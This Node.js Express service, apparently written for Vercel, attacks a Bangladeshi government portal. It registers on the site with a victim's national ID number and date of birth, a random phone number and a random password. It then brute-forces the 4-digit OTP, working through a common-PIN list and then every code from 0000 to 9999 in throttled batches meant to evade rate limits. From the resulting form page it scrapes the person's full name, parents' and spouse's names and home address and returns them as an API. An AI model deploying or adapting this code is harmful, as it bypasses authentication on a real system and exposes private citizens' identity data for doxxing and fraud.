const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Configuration
const MOBILE_PREFIX = "019";
const MAX_CONCURRENT = 10; // Vercel-এর জন্য কম
const REQUEST_TIMEOUT = 10000; // 10 seconds per request
const TOTAL_TIMEOUT = 90000; // 90 seconds total

// Simple headers for Vercel
const BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
};

// Optimized axios instance for Vercel
const createAxiosInstance = () => {
    return axios.create({
        timeout: REQUEST_TIMEOUT,
        maxRedirects: 0,
        validateStatus: null,
        httpsAgent: new (require('https').Agent)({
            keepAlive: true,
            maxSockets: 5,
            rejectUnauthorized: false // Vercel-এ certificate issues avoid
        })
    });
};

// Helper functions
function randomMobile(prefix) {
    return prefix + Math.random().toString().slice(2, 10);
}

function randomPassword() {
    const uppercase = String.fromCharCode(65 + Math.floor(Math.random() * 26));
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let randomChars = '';
    for (let i = 0; i < 8; i++) randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
    return "#" + uppercase + randomChars;
}

// Optimized brute force with retry logic
async function bruteForceOTP(session, cookies, nid, dob) {
    const startTime = Date.now();
    let foundOTP = null;
    
    // Common OTPs first (increased for better success rate)
    const commonOTPs = [
        '1234', '0000', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999',
        '4321', '1122', '1212', '1313', '2323', '1001', '2002', '3003', '4004', '5005',
        '2020', '2021', '2022', '2023', '2024', '1990', '1980', '1971', '1981', '1969',
        '2468', '1357', '8642', '7531', '1590', '3579', '0007', '0070', '0700', '7000',
        '1110', '2220', '3330', '4440', '5550', '6660', '7770', '8880', '9990',
        '1230', '1231', '1232', '1233', '1235', '1236', '1237', '1238', '1239',
        '2345', '3456', '4567', '5678', '6789', '7890', '8901', '9012',
        '0987', '9876', '8765', '7654', '6543', '5432', '4321', '3210',
        '1112', '2223', '3334', '4445', '5556', '6667', '7778', '8889', '9991',
        '1010', '2020', '3030', '4040', '5050', '6060', '7070', '8080', '9090',
        '0101', '0202', '0303', '0404', '0505', '0606', '0707', '0808', '0909',
        '1212', '2323', '3434', '4545', '5656', '6767', '7878', '8989',
        '1981', '1982', '1983', '1984', '1985', '1986', '1987', '1988', '1989',
        '1991', '1992', '1993', '1994', '1995', '1996', '1997', '1998', '1999',
        '2001', '2002', '2003', '2004', '2005', '2006', '2007', '2008', '2009',
        '0510', '1005', '1501', '0115', '1015', '5101', '0151', '1051'
    ];
    
    // Try common OTPs first
    for (let i = 0; i < commonOTPs.length && !foundOTP; i++) {
        try {
            const otp = commonOTPs[i];
            const response = await session.post(
                'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step',
                `otpDigit1=${otp[0]}&otpDigit2=${otp[1]}&otpDigit3=${otp[2]}&otpDigit4=${otp[3]}`,
                {
                    headers: {
                        ...BASE_HEADERS,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Cookie': cookies.join('; '),
                        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
                    },
                    timeout: 3000
                }
            );
            
            if (response.status === 302 && response.headers.location && 
                response.headers.location.includes('movementContractor/form')) {
                foundOTP = otp;
                break;
            }
        } catch (error) {
            // Continue on error
        }
        
        // Small delay to avoid rate limiting
        if (i % 5 === 0) {
            await new Promise(resolve => setTimeout(resolve, 100));
        }
    }
    
    // If not found in common, try sequential from 0000-9999 but optimized
    if (!foundOTP) {
        const promises = [];
        
        for (let i = 0; i < 10000 && !foundOTP; i += MAX_CONCURRENT) {
            const batchPromises = [];
            
            for (let j = 0; j < MAX_CONCURRENT && (i + j) < 10000; j++) {
                const otp = (i + j).toString().padStart(4, '0');
                
                // Skip already tried common OTPs
                if (commonOTPs.includes(otp)) continue;
                
                batchPromises.push((async () => {
                    try {
                        const response = await session.post(
                            'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step',
                            `otpDigit1=${otp[0]}&otpDigit2=${otp[1]}&otpDigit3=${otp[2]}&otpDigit4=${otp[3]}`,
                            {
                                headers: {
                                    ...BASE_HEADERS,
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                    'Cookie': cookies.join('; '),
                                    'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
                                },
                                timeout: 3000
                            }
                        );
                        
                        if (response.status === 302 && response.headers.location && 
                            response.headers.location.includes('movementContractor/form')) {
                            return otp;
                        }
                    } catch (error) {
                        // Ignore errors
                    }
                    return null;
                })());
            }
            
            // Wait for batch and check results
            const results = await Promise.all(batchPromises);
            for (const result of results) {
                if (result) {
                    foundOTP = result;
                    break;
                }
            }
            
            // Check timeout
            if (Date.now() - startTime > TOTAL_TIMEOUT) {
                break;
            }
            
            // Delay between batches
            if (!foundOTP) {
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        }
    }
    
    return foundOTP;
}

// Main API endpoint
app.get('/get-info', async (req, res) => {
    const startTime = Date.now();
    
    try {
        const { nid, dob } = req.query;
        
        if (!nid || !dob) {
            return res.json({
                success: false,
                error: 'NID and DOB (YYYY-MM-DD) are required'
            });
        }
        
        // Set response timeout
        res.setTimeout(TOTAL_TIMEOUT + 10000);
        
        const session = createAxiosInstance();
        const mobile = randomMobile(MOBILE_PREFIX);
        const password = randomPassword();
        
        // Step 1: Create session
        try {
            const response = await session.post(
                'https://fsmms.dgf.gov.bd/bn/step2/movementContractor',
                `nidNumber=${encodeURIComponent(nid)}&email=&mobileNo=${encodeURIComponent(mobile)}&dateOfBirth=${encodeURIComponent(dob)}&password=${encodeURIComponent(password)}&confirm_password=${encodeURIComponent(password)}&next1=`,
                {
                    headers: {
                        ...BASE_HEADERS,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor'
                    }
                }
            );
            
            if (response.status !== 302 || !response.headers.location || 
                !response.headers.location.includes('mov-verification')) {
                return res.json({
                    success: false,
                    error: 'Invalid NID or DOB'
                });
            }
            
            const cookies = response.headers['set-cookie'] || [];
            const cookieString = cookies.map(c => c.split(';')[0]).join('; ');
            
            // Step 2: Brute force OTP
            const foundOTP = await bruteForceOTP(session, cookieString.split(';'), nid, dob);
            
            if (!foundOTP) {
                return res.json({
                    success: false,
                    error: 'Could not find valid OTP',
                    elapsedTime: `${Date.now() - startTime}ms`
                });
            }
            
            // Step 3: Get form data
            const formResponse = await session.get(
                'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form',
                {
                    headers: {
                        ...BASE_HEADERS,
                        'Cookie': cookieString,
                        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
                    }
                }
            );
            
            // Extract data from HTML
            const html = formResponse.data;
            
            // Helper function to extract field value
            const extractValue = (fieldName) => {
                const regex = new RegExp(`name="${fieldName}"[^>]*value="([^"]*)"`, 'i');
                const match = html.match(regex);
                return match ? match[1] : '';
            };
            
            // Extract all required fields
            const fields = [
                'contractorName', 'fatherName', 'motherName', 'spouseName',
                'nidPerDivision', 'nidPerDistrict', 'nidPerUpazila', 'nidPerUnion',
                'nidPerVillage', 'nidPerWard', 'nidPerZipCode', 'nidPerPostOffice',
                'nidPerHolding', 'nidPerMouza', 'nationality'
            ];
            
            const extractedData = {};
            fields.forEach(field => {
                extractedData[field] = extractValue(field);
            });
            
            // Construct address
            const addressParts = [];
            if (extractedData.nidPerHolding) addressParts.push(`বাসা/হোল্ডিং: ${extractedData.nidPerHolding}`);
            if (extractedData.nidPerVillage) addressParts.push(`গ্রাম: ${extractedData.nidPerVillage}`);
            if (extractedData.nidPerMouza) addressParts.push(`মৌজা: ${extractedData.nidPerMouza}`);
            if (extractedData.nidPerUnion) addressParts.push(`ইউনিয়ন: ${extractedData.nidPerUnion}`);
            if (extractedData.nidPerWard) addressParts.push(`ওয়ার্ড: ${extractedData.nidPerWard}`);
            if (extractedData.nidPerPostOffice) addressParts.push(`ডাকঘর: ${extractedData.nidPerPostOffice}`);
            if (extractedData.nidPerZipCode) addressParts.push(`পোস্টকোড: ${extractedData.nidPerZipCode}`);
            if (extractedData.nidPerUpazila) addressParts.push(`উপজেলা: ${extractedData.nidPerUpazila}`);
            if (extractedData.nidPerDistrict) addressParts.push(`জেলা: ${extractedData.nidPerDistrict}`);
            if (extractedData.nidPerDivision) addressParts.push(`বিভাগ: ${extractedData.nidPerDivision}`);
            
            const address = addressParts.join(', ');
            
            // Final response structure
            const result = {
                success: true,
                data: {
                    nameBangla: extractedData.contractorName || '',
                    nationalId: nid,
                    dateOfBirth: dob,
                    fatherName: extractedData.fatherName || '',
                    motherName: extractedData.motherName || '',
                    spouseName: extractedData.spouseName || '',
                    birthPlace: extractedData.nidPerDistrict || '',
                    nationality: extractedData.nationality || 'বাংলাদেশী',
                    division: extractedData.nidPerDivision || '',
                    district: extractedData.nidPerDistrict || '',
                    upazila: extractedData.nidPerUpazila || '',
                    union: extractedData.nidPerUnion || '',
                    village: extractedData.nidPerVillage || '',
                    ward: extractedData.nidPerWard || '',
                    zip_code: extractedData.nidPerZipCode || '',
                    post_office: extractedData.nidPerPostOffice || '',
                    permanentAddress: address,
                    presentAddress: address
                },
                metadata: {
                    processingTime: `${Date.now() - startTime}ms`,
                    otpFound: foundOTP,
                    mobileUsed: mobile,
                    timestamp: new Date().toISOString()
                }
            };
            
            return res.json(result);
            
        } catch (error) {
            if (error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
                return res.json({
                    success: false,
                    error: 'Connection timeout to government server',
                    elapsedTime: `${Date.now() - startTime}ms`
                });
            }
            throw error;
        }
        
    } catch (error) {
        return res.json({
            success: false,
            error: error.message || 'Internal server error',
            elapsedTime: `${Date.now() - startTime}ms`
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        service: 'NID Info API'
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({
        message: 'NID Information API',
        endpoint: '/get-info?nid=YOUR_NID&dob=YYYY-MM-DD',
        note: 'This API retrieves NID information from the government portal'
    });
});

// Handle Vercel serverless
if (process.env.VERCEL) {
    module.exports = app;
} else {
    app.listen(PORT, () => {
        console.log(`Server running on port ${PORT}`);
    });
}
